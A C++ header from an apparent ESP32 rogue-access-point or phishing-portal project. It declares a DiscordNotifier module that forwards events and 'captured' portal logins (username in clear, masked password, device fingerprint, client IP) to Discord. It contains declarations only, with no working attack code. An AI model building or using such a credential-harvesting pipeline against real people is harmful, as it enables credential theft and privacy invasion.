// Discord: eventos ao vivo e relatório explícito (JSON + resumo).
// Relatórios incluem valores do portal; HTTPS validado; fila limitada em RAM.
#pragma once

#include <Arduino.h>

#include "Event.h"
#include "IModule.h"
#include "network/AccessPoint.h"
#include "storage/Settings.h"

namespace mak {

class DiscordNotifier : public IModule {
 public:
  DiscordNotifier(Settings& settings, AccessPoint& ap)
      : settings_(settings), ap_(ap) {}

  bool begin() override;
  void loop() override;   // drena a fila quando o uplink está conectado
  void stop() override;
  const char* name() const override { return "DiscordNotifier"; }

  bool enabled() const;

  // Enfileira um embed a partir de um evento do barramento.
  void notifyEvent(const Event& ev);

  // Captura do portal: notifica o login (em claro), o template e a senha
  // mascarada (cfg::kPasswordMask). Nunca recebe nem envia o texto da senha.
  // deviceSummary: resumo do fingerprint do mesmo aparelho (nullptr se não houver).
  // ip: IP que o cliente recebeu no SoftAP (nullptr/"" se desconhecido).
  void notifyCredentialCapture(const char* user, const char* tmpl,
                               const char* deviceSummary = nullptr,
                               const char* ip = nullptr);

  // Mensagens de narrativa prontas (chamadas pelo App em transições).
  void notifyText(const char* title, const char* description, uint32_t color);

  // Envia um embed de teste imediato (comando serial "discord test").
  bool sendTest();
  bool queueReport(const String& report, const String& summary);
  const char* reportState() const { return reportState_; }
  int lastHttpCode() const { return lastHttpCode_; }
  uint32_t dropped() const { return dropped_; }

  size_t pending() const { return count_ + (report_.length() ? 1 : 0); }

 private:
  static constexpr size_t kQueueCap = 10;

  bool enqueue(const String& payload);
  bool postNow(const String& payload, const char* contentType = "application/json");
  String buildEmbed(const char* title, const char* description, uint32_t color,
                    const char* footer) const;

  Settings& settings_;
  AccessPoint& ap_;

  String queue_[kQueueCap];
  size_t head_ = 0;
  size_t count_ = 0;
  uint32_t lastFlushMs_ = 0;
  uint32_t retryDelayMs_ = 400;
  uint32_t retryAfterMs_ = 0;
  uint32_t dropped_ = 0;
  int lastHttpCode_ = 0;
  String report_;
  const char* reportState_ = "idle";
};

}  // namespace mak
